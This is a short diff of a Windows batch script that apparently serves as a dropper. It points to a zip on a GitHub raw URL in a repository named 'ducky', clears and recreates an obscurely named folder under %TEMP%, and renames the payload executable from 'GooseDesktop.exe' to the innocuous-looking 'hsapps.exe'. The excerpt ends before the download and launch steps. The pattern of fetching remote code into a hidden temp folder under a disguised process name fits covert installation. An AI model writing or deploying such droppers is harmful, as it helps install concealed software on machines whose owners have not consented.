@@ -1,6 +1,6 @@
 @echo off
 set "URL=https://raw.githubusercontent.com/BLOCKCE/ducky/refs/heads/main/dg.zip"
-set "EXE=GooseDesktop.exe"
+set "EXE=hsapps.exe"
 set "DIR=%TEMP%\awdiojawdoij"
 
 rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"
